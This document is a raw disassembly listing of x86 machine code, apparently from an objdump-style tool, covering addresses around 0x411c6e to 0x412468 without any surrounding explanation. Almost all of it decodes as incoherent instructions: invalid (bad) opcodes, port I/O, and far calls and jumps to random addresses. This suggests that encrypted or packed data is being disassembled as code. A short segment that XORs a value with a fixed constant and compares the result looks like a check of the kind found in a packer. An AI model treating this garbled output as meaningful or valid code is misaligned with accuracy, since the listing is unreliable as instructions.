  411c6e:	and    BYTE PTR [ebp+0x63924b2e],cl
  411c74:	out    dx,eax
  411c75:	jg     0x411c04
  411c77:	retf   0x496a
  411c7a:	mov    ds:0x4c525418,al
  411c7f:	stos   DWORD PTR es:[edi],eax
  411c80:	nop
  411c81:	jns    0x411ce4
  411c83:	in     al,dx
  411c84:	sbb    BYTE PTR [edx+edi*1-0x50972521],dl
  411c8b:	push   cs
  411c8c:	mov    dh,0xd1
  411c8e:	out    dx,eax
  411c8f:	dec    esp
  411c90:	shr    BYTE PTR [edx],0x11
  411c93:	outs   dx,DWORD PTR ds:[esi]
  411c94:	iret   
  411c95:	cmp    eax,0x57cf8c60
  411c9a:	sub    ebx,eax
  411c9c:	ror    BYTE PTR [ecx+edi*8-0x53196df3],cl
  411ca3:	pop    es
  411ca4:	or     al,0xf2
  411ca6:	stos   BYTE PTR es:[edi],al
  411ca7:	sbb    DWORD PTR fs:[ebx+0xf57a93b],0xffffffce
  411caf:	push   edx
  411cb0:	pop    ebp
  411cb1:	or     al,0x5a
  411cb3:	nop
  411cb4:	pop    edi
  411cb5:	aam    0x1b
  411cb7:	bound  ecx,QWORD PTR [ecx]
  411cb9:	scas   al,BYTE PTR es:[edi]
  411cba:	(bad)  
  411cbb:	loope  0x411ce5
  411cbd:	cmp    eax,0x1e76a081
  411cc2:	repz pop ds
  411cc4:	sbb    ebx,0xffffff91
  411cc7:	adc    edx,DWORD PTR [ebx+ebp*2]
  411cca:	out    0xa7,eax
  411ccc:	dec    eax
  411ccd:	fucom  st(6)
  411ccf:	mov    dl,0x2a
  411cd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cd2:	inc    ecx
  411cd3:	rcl    BYTE PTR [ebx-0x3b0000a3],0xae
  411cda:	and    al,0xc8
  411cdc:	add    ah,0x5a
  411cdf:	lds    ebx,FWORD PTR [edi+ecx*2+0x68fdeabe]
  411ce6:	mov    ds:0x6ac2b051,eax
  411ceb:	xchg   ebp,eax
  411cec:	cwde   
  411ced:	clc    
  411cee:	mov    fs:0xecaa8888,eax
  411cf4:	ins    BYTE PTR es:[edi],dx
  411cf5:	mov    eax,ds:0xb01cce94
  411cfa:	mov    ebx,0x42063e23
  411cff:	clc    
  411d00:	and    dh,cl
  411d02:	or     edi,0xffffffa2
  411d05:	dec    esp
  411d06:	push   ebp
  411d07:	sbb    bh,al
  411d09:	cmc    
  411d0a:	mov    al,ds:0xc8d59f01
  411d0f:	scas   eax,DWORD PTR es:[edi]
  411d10:	xlat   BYTE PTR ds:[ebx]
  411d11:	push   es
  411d12:	clc    
  411d13:	adc    al,BYTE PTR ds:[esi+ebp*1]
  411d17:	retf   0x28cd
  411d1a:	jb     0x411d51
  411d1c:	pop    ds
  411d1d:	ds push ebp
  411d1f:	inc    ebp
  411d20:	mov    edi,0x5690de2b
  411d25:	xchg   esp,eax
  411d26:	mov    esi,DWORD PTR ss:[esp+edx*8]
  411d2a:	ds dec eax
  411d2c:	add    eax,0x869d2bd7
  411d31:	dec    edx
  411d32:	jns    0x411d83
  411d34:	cmp    esp,DWORD PTR [ebp-0x5adeae6b]
  411d3a:	sub    esp,DWORD PTR [eax+edx*2+0x42e966ce]
  411d41:	loope  0x411d4c
  411d43:	fmul   QWORD PTR [edi]
  411d45:	cwde   
  411d46:	fild   QWORD PTR [edx]
  411d48:	es call 0x840b:0xacc7b590
  411d50:	ja     0x411d3e
  411d52:	(bad)  
  411d54:	sub    eax,0xbb73f036
  411d59:	xchg   ebp,eax
  411d5a:	xor    al,0xe5
  411d5c:	dec    ecx
  411d5d:	mov    ebp,0x43e7a828
  411d62:	cmp    cl,0xad
  411d65:	sti    
  411d66:	test   BYTE PTR es:[esp+ecx*4-0x3624a042],0xcd
  411d6f:	mov    esi,0x2740cf4a
  411d74:	sar    BYTE PTR es:[edx-0xdead8a1],1
  411d7b:	jbe    0x411d1f
  411d7d:	scas   eax,DWORD PTR es:[edi]
  411d7e:	mov    ds:0xfd77c570,al
  411d83:	jge    0x411de9
  411d85:	or     al,0xe7
  411d87:	xchg   esp,eax
  411d88:	mov    edi,0x460aeef8
  411d8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d8e:	xchg   esp,eax
  411d8f:	xor    BYTE PTR [ecx],bl
  411d91:	jg     0x411dc0
  411d93:	outs   dx,BYTE PTR ds:[esi]
  411d94:	adc    ah,BYTE PTR [ebx+0x1633af26]
  411d9a:	cld    
  411d9b:	test   DWORD PTR [edi+edi*8+0x40],esp
  411d9f:	adc    eax,0x446a77f0
  411da4:	je     0x411e0a
  411da6:	dec    esi
  411da7:	jo     0x411e25
  411da9:	sbb    BYTE PTR [esi+0x33fcc94d],ch
  411daf:	lods   eax,DWORD PTR ds:[esi]
  411db0:	mov    al,dl
  411db2:	sbb    edx,esp
  411db4:	out    0x83,eax
  411db6:	clc    
  411db7:	mov    ss,WORD PTR [ebp+0x708e2bc3]
  411dbd:	ja     0x411e06
  411dbf:	dec    ebp
  411dc0:	in     al,dx
  411dc1:	stos   DWORD PTR es:[edi],eax
  411dc2:	jae    0x411dd2
  411dc4:	popf   
  411dc5:	push   ds
  411dc6:	mov    ds:0x80f333e,al
  411dcb:	imul   eax,DWORD PTR [eax-0x32],0xffffffb5
  411dcf:	cmp    bh,BYTE PTR [ebx]
  411dd1:	cmc    
  411dd2:	sbb    BYTE PTR [edx-0x56cccad1],bh
  411dd8:	call   edx
  411dda:	loope  0x411db0
  411ddc:	test   ecx,0x8189a0fe
  411de2:	arpl   bp,ax
  411de4:	jle    0x411e5b
  411de6:	nop
  411de7:	push   esp
  411de8:	sbb    BYTE PTR [edx-0x5],al
  411deb:	loopne 0x411e3d
  411ded:	mov    dl,0x20
  411def:	adc    ecx,DWORD PTR [eax-0x41]
  411df2:	xchg   ah,ah
  411df4:	xchg   edi,eax
  411df5:	in     eax,0x8e
  411df7:	pop    ds
  411df8:	rcl    BYTE PTR [edi-0x35],0x6b
  411dfc:	stc    
  411dfd:	dec    edi
  411dfe:	mov    eax,0xff14a242
  411e03:	test   DWORD PTR [ecx],eax
  411e05:	xor    eax,DWORD PTR [ecx+0x3b9df181]
  411e0b:	arpl   WORD PTR [ecx-0x21351e33],bp
  411e11:	or     esp,edx
  411e13:	add    BYTE PTR [esi*2+0x3f9d48cf],dh
  411e1a:	mov    BYTE PTR [edi-0x69d967dd],0xca
  411e21:	cmp    BYTE PTR [eax-0x17e1836f],bl
  411e27:	push   edi
  411e28:	idiv   BYTE PTR [eax+edi*2]
  411e2b:	adc    edi,edi
  411e2d:	pop    ss
  411e2e:	or     DWORD PTR [bp+di+0x2d],ebx
  411e32:	or     eax,eax
  411e34:	or     eax,0x3368f285
  411e39:	cwde   
  411e3a:	sbb    al,0x99
  411e3c:	jmp    edi
  411e3e:	pop    esp
  411e3f:	xchg   esi,eax
  411e40:	xor    eax,eax
  411e42:	clc    
  411e43:	(bad)
  411e46:	in     eax,0x6
  411e48:	pop    ds
  411e49:	pop    ebp
  411e4a:	push   ss
  411e4b:	or     ah,BYTE PTR [eax]
  411e4d:	not    DWORD PTR [ebx-0x70]
  411e50:	xchg   eax,esi
  411e52:	ins    DWORD PTR es:[edi],dx
  411e53:	cmp    al,BYTE PTR [ebx-0x22]
  411e56:	push   eax
  411e57:	rcl    BYTE PTR [ebx-0x70b8484f],cl
  411e5d:	les    ebx,FWORD PTR [edi-0x202d031a]
  411e63:	jmp    0x1accf9cb
  411e68:	mov    ds:0x2678d13a,al
  411e6d:	int    0x0
  411e6f:	xor    esp,DWORD PTR [bx+0x17]
  411e73:	or     ah,0xaa
  411e76:	lds    esp,FWORD PTR cs:[ebp+0x2d489a89]
  411e7d:	push   ecx
  411e7e:	jmp    0xd8e6a503
  411e83:	and    al,0xa5
  411e85:	push   ds
  411e86:	adc    ch,BYTE PTR [ebx+0x32]
  411e89:	pop    eax
  411e8a:	inc    esp
  411e8b:	out    dx,al
  411e8c:	push   cs
  411e8d:	sub    ebx,edx
  411e8f:	pop    es
  411e90:	adc    BYTE PTR [ecx-0xb],bl
  411e93:	sub    edx,DWORD PTR [eax-0x7f0a7d1]
  411e99:	outs   dx,BYTE PTR ds:[esi]
  411e9a:	jmp    0x411e46
  411e9c:	mov    ds:0xc6dfece,al
  411ea1:	(bad)  
  411ea3:	mov    esp,0x84a403b6
  411ea8:	ins    DWORD PTR es:[edi],dx
  411ea9:	shl    BYTE PTR [ebx],cl
  411eab:	repnz aaa 
  411ead:	ja     0x411ee1
  411eaf:	clc    
  411eb0:	or     ecx,ebp
  411eb2:	int3   
  411eb3:	adc    edx,DWORD PTR [ebp-0x11]
  411eb6:	out    dx,al
  411eb7:	xchg   BYTE PTR [edi+eiz*2+0x40],ah
  411ebb:	jb     0x411edb
  411ebd:	jp     0x411e75
  411ebf:	std    
  411ec0:	xchg   esp,eax
  411ec1:	les    edi,FWORD PTR [esi-0x3c]
  411ec4:	(bad)
  411ec7:	mov    WORD PTR [edi],ds
  411ec9:	jl     0x411f0e
  411ecb:	add    eax,0xc616114b
  411ed0:	push   es
  411ed1:	push   ebx
  411ed2:	retf   0xceea
  411ed5:	repnz std 
  411ed7:	xchg   edi,eax
  411ed8:	push   es
  411ed9:	and    bh,BYTE PTR [ecx]
  411edb:	loope  0x411e95
  411edd:	or     al,0xa6
  411edf:	(bad)  
  411ee0:	push   cs
  411ee1:	or     BYTE PTR [esi-0x5257222],ah
  411ee7:	lea    esp,[edi-0x336f7790]
  411eed:	cmp    bl,bh
  411eef:	jae    0x411f27
  411ef1:	xchg   BYTE PTR [edx+0x5e],dh
  411ef4:	jbe    0x411eeb
  411ef6:	mov    al,ds:0x97f79dd1
  411efb:	call   0xa053bcac
  411f00:	mov    esi,0xaae93aef
  411f05:	je     0x411f2c
  411f07:	addr16 mov al,0x43
  411f0a:	nop
  411f0b:	je     0x411ee5
  411f0d:	shl    eax,0x2
  411f10:	mov    DWORD PTR [ebp+0x10],edx
  411f13:	mov    edx,DWORD PTR [ebp-0x54]
  411f16:	xor    eax,0xba699573
  411f1b:	mov    DWORD PTR [ebp+0x14],edx
  411f1e:	cmp    eax,DWORD PTR [ebp+0x10]
  411f21:	jne    0x416379
  411f27:	mov    eax,edx
  411f29:	cmp    DWORD PTR [ebp+0xc],eax
  411f2c:	jne    0x416379
  411f32:	mov    DWORD PTR [ebp+0x8],0xba699573
  411f39:	jmp    0x4124c3
  411f3e:	(bad)  
  411f3f:	repz mov al,ds:0x46199861
  411f45:	sbb    dh,cl
  411f47:	jmp    0x852acdc2
  411f4c:	mov    al,ds:0x1630256e
  411f51:	push   ss
  411f52:	cmp    eax,0x8a161604
  411f57:	sti    
  411f58:	cld    
  411f59:	sub    al,0x11
  411f5b:	jmp    0x411f03
  411f5d:	out    0x78,eax
  411f5f:	add    ecx,edi
  411f61:	(bad)  
  411f64:	(bad)  
  411f65:	xor    al,0xfa
  411f67:	sub    ch,BYTE PTR [edx]
  411f69:	je     0x411f8c
  411f6b:	mov    bh,0x58
  411f6d:	pop    ecx
  411f6e:	xlat   BYTE PTR ds:[ebx]
  411f6f:	push   ecx
  411f70:	fmul   QWORD PTR [ecx+0x39]
  411f73:	jl     0x411f73
  411f75:	iret   
  411f76:	xchg   ebp,eax
  411f77:	lahf   
  411f78:	jge    0x411f57
  411f7a:	mov    BYTE PTR [ecx+eax*2-0x2c],al
  411f7e:	ja     0x411fc1
  411f80:	pop    esi
  411f81:	pop    ecx
  411f82:	jle    0x411f40
  411f84:	pop    eax
  411f85:	mov    dl,0xcb
  411f87:	jnp    0x411f6e
  411f89:	xor    eax,DWORD PTR [esi]
  411f8b:	icebp  
  411f8c:	pop    eax
  411f8d:	sti    
  411f8e:	mov    ds:0xb4da288,al
  411f93:	ja     0x411f69
  411f95:	bound  esp,QWORD PTR [edx-0x3f]
  411f98:	inc    ecx
  411f99:	sahf   
  411f9a:	jnp    0x411f33
  411f9c:	mov    eax,0xa7720aad
  411fa1:	call   0xe381:0xbc097cdc
  411fa8:	push   0xffffffd3
  411faa:	mov    ah,0xda
  411fad:	imul   ebp,ebx,0x53
  411fb0:	mov    ds:0xa4d811bc,eax
  411fb5:	in     al,0x8e
  411fb7:	inc    eax
  411fb8:	or     eax,0x966de237
  411fbd:	icebp  
  411fbe:	dec    eax
  411fbf:	push   esp
  411fc0:	stos   BYTE PTR es:[edi],al
  411fc1:	mov    edi,0xf3de8322
  411fc6:	pop    edx
  411fc7:	fmul   DWORD PTR [ebp-0x46280f6e]
  411fcd:	shr    DWORD PTR ds:0x68f8ba27,cl
  411fd3:	dec    eax
  411fd4:	sub    cl,ch
  411fd6:	xor    bh,BYTE PTR [ecx+0x214abb77]
  411fdc:	aad    0xec
  411fde:	shr    DWORD PTR [ebx+esi*4+0x6],1
  411fe2:	rcr    DWORD PTR ds:0xcecdca44,cl
  411fe8:	lods   al,BYTE PTR ds:[esi]
  411fe9:	loope  0x411f9e
  411feb:	add    eax,0xdc027be9
  411ff0:	fucomip st,st(7)
  411ff2:	das    
  411ff3:	jle    0x411fe5
  411ff5:	bound  esp,QWORD PTR [edi]
  411ff7:	cld    
  411ff8:	fbld   TBYTE PTR [eax-0xc]
  411ffb:	adc    eax,0x8711f912
  412000:	pop    edx
  412001:	es ss jp 0x411f8f
  412005:	add    esi,DWORD PTR [edi]
  412007:	(bad)  
  412008:	push   ds
  412009:	dec    edx
  41200a:	sbb    cl,BYTE PTR [esi+0x43ba58e]
  412010:	sbb    dl,BYTE PTR [eax]
  412012:	(bad)  
  412013:	repnz pop edx
  412015:	dec    eax
  412016:	jp     0x41204c
  412018:	mov    ebp,0x1d08e4f2
  41201d:	sbb    BYTE PTR [esi],al
  41201f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412020:	add    ecx,esi
  412022:	aam    0x5f
  412024:	xor    eax,0xe0e824fa
  412029:	adc    DWORD PTR gs:[edi-0x1b400999],0xf0609e97
  412034:	jb     0x411fc7
  412036:	loop   0x4120a5
  412038:	add    BYTE PTR [edx],dh
  41203a:	out    0xbb,eax
  41203c:	push   ecx
  41203d:	sar    BYTE PTR [ecx+0x65],1
  412040:	jo     0x411fc4
  412042:	int    0x24
  412044:	mov    ah,0x7a
  412046:	push   0xfffffffc
  412048:	aas    
  412049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41204a:	cmp    al,0xaf
  41204c:	in     al,dx
  41204d:	ins    BYTE PTR es:[edi],dx
  41204e:	cmp    DWORD PTR [eax+0x1d13ae70],esi
  412054:	dec    ecx
  412055:	fcmovb st,st(7)
  412057:	cmp    edx,esi
  412059:	push   0x348ae66b
  41205e:	and    ebp,DWORD PTR ds:0xecdbebda
  412064:	add    eax,0x420b980a
  412069:	add    ebp,DWORD PTR ds:0xb643dab3
  41206f:	lea    ecx,ds:0xda93fa54
  412075:	int    0x81
  412077:	jecxz  0x4120c6
  412079:	inc    edx
  41207a:	pop    ss
  41207b:	nop
  41207c:	pop    esi
  41207d:	inc    edi
  41207e:	bound  eax,QWORD PTR [esi-0x65e75da5]
  412084:	add    bh,BYTE PTR [edi]
  412086:	dec    ebp
  412087:	push   ds
  412088:	pop    ss
  412089:	shl    BYTE PTR [ebx],1
  41208b:	sub    DWORD PTR [ebx-0x47],esp
  41208e:	int    0xcf
  412090:	inc    ecx
  412091:	xchg   BYTE PTR [eax],cl
  412093:	aas    
  412094:	jmp    0x41202d
  412096:	and    BYTE PTR [edi+0x72],bl
  412099:	cmp    DWORD PTR [esi],eax
  41209b:	and    ch,BYTE PTR [esi]
  41209d:	xchg   ebp,eax
  41209e:	call   0x9261:0xf313352e
  4120a5:	pushf  
  4120a6:	aas    
  4120a7:	cmp    DWORD PTR [esp+eax*4],0xc8be42b3
  4120ae:	aad    0x54
  4120b0:	xor    ch,BYTE PTR [ebp+0x77]
  4120b3:	pop    ss
  4120b4:	ret    0x8642
  4120b7:	loopne 0x412133
  4120b9:	and    BYTE PTR [ebp+0x17],ah
  4120bc:	repz mov eax,ds:0xdce6fba4
  4120c2:	mov    dl,0x5b
  4120c4:	test   al,0xa8
  4120c6:	cmp    ch,BYTE PTR [ebx+0x628540f7]
  4120cc:	or     bl,dh
  4120ce:	mov    ecx,DWORD PTR [ecx-0x70d9413f]
  4120d4:	jno    0x412082
  4120d6:	imul   edi,DWORD PTR ds:0x6309dffa,0xffffff9f
  4120dd:	cmc    
  4120de:	dec    edx
  4120df:	fnstenv [edx-0x63]
  4120e2:	lahf   
  4120e3:	mov    cl,0x67
  4120e5:	stos   DWORD PTR es:[edi],eax
  4120e6:	xor    DWORD PTR [edi+ebx*8+0x368fe140],edi
  4120ed:	nop
  4120ee:	inc    ecx
  4120ef:	add    eax,0x63d15a0a
  4120f4:	mov    ch,0xa5
  4120f6:	mov    ebp,0xbfa6b5d2
  4120fb:	xor    eax,0x70d8ead2
  412100:	hlt    
  412101:	pop    esp
  412102:	mov    cs,eax
  412104:	jle    0x4120da
  412106:	jns    0x412101
  412108:	sti    
  412109:	mov    DWORD PTR [ebx],ebx
  41210b:	icebp  
  41210c:	push   ds
  41210d:	fdiv   DWORD PTR [ebx-0x24dfd76f]
  412113:	out    dx,al
  412114:	adc    al,0x51
  412116:	or     BYTE PTR [eax],bh
  412118:	dec    ebx
  412119:	or     al,0xc2
  41211b:	outs   dx,BYTE PTR ds:[esi]
  41211c:	inc    ecx
  41211d:	je     0x4120fb
  41211f:	mov    bh,0xdf
  412121:	add    ah,BYTE PTR [eax]
  412123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412124:	fnstcw WORD PTR [esi-0x34aa4ea6]
  41212a:	or     ebx,DWORD PTR [esi-0x3b83dbd7]
  412130:	nop
  412131:	inc    ebp
  412132:	mov    dl,0x92
  412135:	jge    0x4120d1
  412137:	mov    ch,0xa7
  412139:	orps   xmm7,XMMWORD PTR [ecx-0x1d04f277]
  412140:	in     al,0xfd
  412142:	enter  0x3ad8,0xcf
  412146:	mov    ds:0x319e6004,eax
  41214b:	jmp    0xd18f9cd1
  412150:	sub    esp,ebp
  412152:	sbb    edi,edx
  412154:	shl    DWORD PTR [edi+eax*4+0x1adcbc59],1
  41215b:	pop    ss
  41215c:	aaa    
  41215d:	inc    ebx
  41215e:	mov    ds:0x8670b45e,al
  412163:	rol    BYTE PTR [ecx],1
  412165:	cdq    
  412166:	mov    esi,0x4f012659
  41216b:	sub    al,0xd7
  41216d:	shl    DWORD PTR [esi-0x27],cl
  412170:	pushf  
  412171:	outs   dx,DWORD PTR ds:[esi]
  412172:	pop    DWORD PTR [esi]
  412174:	dec    ecx
  412175:	cmp    BYTE PTR [eax-0x540d9277],al
  41217b:	xor    bl,BYTE PTR [ebp-0x700df4bd]
  412181:	jae    0x4121e6
  412183:	aad    0x70
  412185:	(bad)  
  412186:	dec    edi
  412187:	loope  0x41218c
  412189:	inc    ebx
  41218a:	rcl    BYTE PTR [ebx+0x23],1
  41218d:	les    edi,FWORD PTR [esi+0x1c]
  412190:	dec    esi
  412191:	add    dh,BYTE PTR [eax]
  412193:	pop    esi
  412194:	ss xchg ebp,eax
  412196:	enter  0x6d6b,0xa
  41219a:	jmp    ebx
  41219c:	repnz or DWORD PTR [edx],esi
  41219f:	scas   eax,DWORD PTR es:[edi]
  4121a0:	push   ebx
  4121a1:	or     al,BYTE PTR [eax-0x7acbcaac]
  4121a7:	or     cl,BYTE PTR [edx-0x74]
  4121aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121ab:	(bad)  
  4121ac:	call   0x4882d0be
  4121b1:	xchg   edx,eax
  4121b2:	mov    WORD PTR [edi-0x54],fs
  4121b5:	call   0xfeffd419
  4121ba:	adc    ebp,DWORD PTR [eax+0x65]
  4121bd:	inc    eax
  4121be:	push   0xf25f4ab1
  4121c3:	pop    ecx
  4121c4:	push   ds
  4121c5:	stc    
  4121c6:	lds    esi,FWORD PTR [edi+0x2e]
  4121c9:	clc    
  4121ca:	mov    bl,0x3d
  4121cc:	sar    BYTE PTR [ebp+esi*2+0x71b5987b],cl
  4121d3:	jle    0x41222a
  4121d5:	iret   
  4121d6:	jmp    0x410b:0xaa2376c7
  4121dd:	icebp  
  4121de:	jmp    0x41217c
  4121e0:	ds jp  0x4121ca
  4121e3:	stos   BYTE PTR es:[edi],al
  4121e4:	aaa    
  4121e5:	push   ss
  4121e6:	rcl    DWORD PTR [esi-0x1a],cl
  4121e9:	inc    edx
  4121ea:	push   0xe9396d57
  4121ef:	pop    ebp
  4121f0:	stc    
  4121f1:	xor    bl,BYTE PTR [esi+0x55ae476]
  4121f7:	pop    eax
  4121f8:	adc    BYTE PTR [ecx-0x5],0xf
  4121fc:	les    eax,FWORD PTR [eax-0x13ae728]
  412202:	push   ebx
  412203:	jmp    0xc4404fdd
  412208:	pusha  
  412209:	dec    ebp
  41220a:	out    0x6,eax
  41220c:	push   edx
  41220d:	aad    0x83
  41220f:	inc    edx
  412211:	ins    BYTE PTR es:[edi],dx
  412212:	or     edx,edx
  412214:	fidiv  DWORD PTR [esi+0x63]
  412217:	or     al,0xa7
  412219:	das    
  41221a:	fldenv [esi+0x39f94823]
  412220:	ins    BYTE PTR es:[edi],dx
  412221:	stos   DWORD PTR es:[edi],eax
  412222:	in     eax,dx
  412223:	(bad)  
  412224:	jl     0x412219
  412226:	push   esi
  412227:	bound  edi,QWORD PTR [ecx]
  412229:	(bad)  
  41222a:	mov    edi,0x91f07b07
  41222f:	inc    esp
  412230:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412231:	repz (bad) 
  412234:	data16 js 0x4121e0
  412237:	(bad)  
  412238:	nop
  412239:	in     eax,dx
  41223a:	xchg   esp,eax
  41223b:	cs int 0x2
  41223e:	daa    
  41223f:	dec    ebx
  412240:	pop    ecx
  412241:	jae    0x412247
  412243:	xchg   ebp,eax
  412244:	(bad)  
  412246:	(bad)  
  412247:	or     dl,BYTE PTR [ebp-0x2e]
  41224a:	cli    
  41224b:	(bad)  
  41224c:	mov    ebp,0x64ccb46a
  412251:	xchg   esi,eax
  412252:	pop    esp
  412253:	std    
  412254:	sbb    esi,DWORD PTR [esi+0xd109749]
  41225a:	dec    esp
  41225b:	mov    dl,0xf9
  41225d:	stos   DWORD PTR es:[edi],eax
  41225e:	xchg   ebp,eax
  41225f:	daa    
  412260:	(bad)  
  412261:	mov    edx,0x10fe44f6
  412266:	test   DWORD PTR [esi+0x1],0xe07535ca
  41226d:	fidivr WORD PTR [esi-0x3381d250]
  412273:	xchg   edi,eax
  412274:	and    al,0x28
  412276:	inc    ebp
  412277:	cmp    DWORD PTR [edx-0x46],eax
  41227a:	inc    esp
  41227b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41227c:	or     DWORD PTR [eax-0x626329e0],eax
  412282:	inc    edx
  412283:	sub    esi,0x14
  412286:	jge    0x41221b
  412288:	data16 add al,0x86
  41228b:	lods   eax,DWORD PTR ds:[esi]
  41228c:	and    ch,BYTE PTR [ecx+edi*1+0x6675d812]
  412293:	pop    esp
  412294:	adc    eax,0x64e9823d
  412299:	add    edi,DWORD PTR [edx+eiz*8-0x7ac21577]
  4122a0:	mov    eax,DWORD PTR [ecx]
  4122a2:	inc    esp
  4122a3:	jmp    0x55d1459b
  4122a8:	ss adc eax,0xdb2ac84c
  4122ae:	cmp    eax,0x5fa618a5
  4122b3:	pop    ds
  4122b4:	sub    DWORD PTR ds:0xc2d2e011,esp
  4122ba:	ins    BYTE PTR es:[edi],dx
  4122bb:	jmp    0xea3b:0xeb1c24b1
  4122c2:	xchg   ebp,eax
  4122c3:	sub    esi,DWORD PTR [ebx]
  4122c5:	add    bh,0xa
  4122c8:	fwait
  4122c9:	imul   ebx,DWORD PTR [ebp-0x73],0xffffffa2
  4122cd:	and    ecx,DWORD PTR [edi-0x27e32b9a]
  4122d3:	inc    eax
  4122d4:	sar    ebx,cl
  4122d6:	cmp    BYTE PTR [edi-0x5a],ch
  4122d9:	push   edx
  4122da:	sbb    BYTE PTR ss:[esi+eiz*8+0x5d81785b],ch
  4122e2:	or     al,0x7
  4122e4:	clc    
  4122e5:	pop    es
  4122e6:	pusha  
  4122e7:	dec    edi
  4122e8:	bnd jae 0x41231c
  4122eb:	jge    0x412359
  4122ed:	push   es
  4122ee:	rcr    dl,cl
  4122f0:	sbb    BYTE PTR [eax-0x4e11f7ae],al
  4122f6:	xchg   esi,eax
  4122f7:	in     al,dx
  4122f8:	jmp    DWORD PTR [eax]
  4122fa:	or     BYTE PTR [ebp-0x59],0xc1
  4122fe:	pop    es
  4122ff:	arpl   WORD PTR [edx],sp
  412301:	adc    eax,0xf03416f9
  412306:	xor    DWORD PTR [edi],eax
  412308:	(bad)  
  412309:	rcl    ecx,1
  41230b:	xchg   BYTE PTR [edx],cl
  41230d:	int3   
  41230e:	mov    ebx,DWORD PTR [ebp+0x4937daac]
  412314:	(bad)  
  412315:	out    0x54,eax
  412317:	jb     0x4122de
  412319:	cmp    BYTE PTR [esi],0x2f
  41231c:	in     al,dx
  41231d:	inc    ecx
  41231e:	mov    al,0xae
  412320:	sbb    edi,DWORD PTR [edi]
  412322:	ror    BYTE PTR [esi],1
  412324:	pop    edi
  412325:	mov    al,0x28
  412327:	jb     0x41235b
  412329:	imul   esi,ebp,0x6d
  41232c:	test   BYTE PTR [ebx+0x52bc538f],bh
  412332:	test   eax,0xf7172013
  412337:	imul   dh
  412339:	lods   al,BYTE PTR ds:[esi]
  41233a:	sbb    eax,0xd785e5b4
  41233f:	data16 mov WORD PTR [esi],fs
  412342:	push   ebx
  412343:	push   ss
  412344:	out    0xdb,eax
  412346:	in     al,dx
  412347:	imul   edx,DWORD PTR [ebx+edi*1+0x48],0x8
  41234c:	add    al,0x8c
  41234e:	outs   dx,BYTE PTR ds:[esi]
  41234f:	(bad)  
  412350:	cmp    ebp,ebp
  412352:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412353:	mov    cl,0x76
  412355:	int3   
  412356:	push   ecx
  412357:	js     0x41236c
  412359:	test   DWORD PTR [edx+eiz*8-0x41],esi
  41235d:	sahf   
  41235e:	inc    ebp
  41235f:	das    
  412360:	inc    BYTE PTR [ebp-0x5c]
  412363:	test   DWORD PTR [esi-0x241e5a26],0x54b53330
  41236d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41236e:	and    al,0xf3
  412370:	adc    ecx,DWORD PTR [esi-0x1bfce6fc]
  412376:	into   
  412377:	mov    edi,0x8f2c7641
  41237c:	rcl    BYTE PTR [ebx],cl
  41237e:	icebp  
  41237f:	ret    0xafdb
  412382:	push   esp
  412383:	inc    ebx
  412384:	push   edx
  412385:	push   esp
  412386:	xor    eax,0xa90f1bb1
  41238c:	adc    DWORD PTR [eax],edx
  41238e:	push   ss
  41238f:	push   edi
  412390:	xchg   edx,eax
  412391:	push   edi
  412392:	mov    al,0x74
  412394:	into   
  412395:	push   ebp
  412396:	ja     0x412351
  412398:	push   esp
  412399:	sub    ebp,0x64175b3
  41239f:	mov    DWORD PTR [eax-0x3cc99754],esi
  4123a5:	lock mov bh,0x8b
  4123a8:	out    0x9,eax
  4123aa:	and    al,BYTE PTR [edx+esi*2]
  4123ad:	mov    ds:0x3c492023,eax
  4123b2:	das    
  4123b3:	mov    al,ds:0x3d65a4db
  4123b8:	cmp    eax,0xf5eb1f2c
  4123bd:	cmp    DWORD PTR [edx+0x1f],ebx
  4123c0:	dec    eax
  4123c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123c2:	xchg   DWORD PTR [edi+0x1b],edi
  4123c5:	push   esi
  4123c7:	call   0xe725094
  4123cc:	push   esi
  4123cd:	nop
  4123ce:	(bad)  
  4123cf:	out    dx,eax
  4123d0:	es and al,0xe7
  4123d3:	mov    esp,0xe0684e4f
  4123d8:	mov    bh,0xa9
  4123da:	adc    DWORD PTR [eax-0x114f6bba],eax
  4123e0:	imul   ebp,DWORD PTR [eax-0x750ae517],0xaf184fd9
  4123ea:	dec    edx
  4123eb:	aas    
  4123ec:	jg     0x41243a
  4123ee:	jl     0x41240d
  4123f0:	mov    BYTE PTR [ebp-0x56],bl
  4123f3:	cdq    
  4123f4:	(bad)  
  4123f5:	(bad)  
  4123f6:	leave  
  4123f7:	or     al,BYTE PTR [edx+ecx*4+0x1c1334f]
  4123fe:	outs   dx,BYTE PTR ds:[esi]
  4123ff:	ss add eax,0xa1244d82
  412405:	sbb    edx,eax
  412407:	adc    al,0xf
  412409:	jl     0x41240a
  41240b:	push   ebx
  41240c:	sub    bh,al
  41240e:	test   eax,0xb4fa86eb
  412413:	jmp    0x471d:0x39aa8b5a
  41241a:	dec    edi
  41241b:	out    0xbb,eax
  41241d:	ret    0x91c
  412420:	icebp  
  412421:	xor    al,0xd
  412423:	out    0x61,al
  412425:	mov    edi,0x8bb4fb67
  41242a:	int3   
  41242b:	and    eax,0xe5f0abd0
  412430:	icebp  
  412431:	in     al,0x2b
  412433:	loopne 0x4123ff
  412435:	aaa    
  412436:	jnp    0x41249b
  412438:	adc    ah,bl
  41243a:	push   ss
  41243b:	add    al,0xfb
  41243d:	jge    0x41240e
  41243f:	stos   DWORD PTR es:[edi],eax
  412440:	add    ah,ah
  412442:	ja     0x412441
  412444:	stos   DWORD PTR es:[edi],eax
  412445:	imul   edx,DWORD PTR [ecx+0x2635f00d],0x3f
  41244c:	cmp    DWORD PTR [ecx-0x50ff365],ebp
  412452:	jno    0x41242e
  412454:	pop    ss
  412455:	into   
  412456:	dec    BYTE PTR [edx-0x7630656d]
  41245c:	mov    cl,BYTE PTR [ebx]
  41245e:	jmp    0x412496
  412460:	push   ss
  412461:	cmp    eax,0xebecda6a
  412466:	jecxz  0x4124a0
  412468:	push   ss
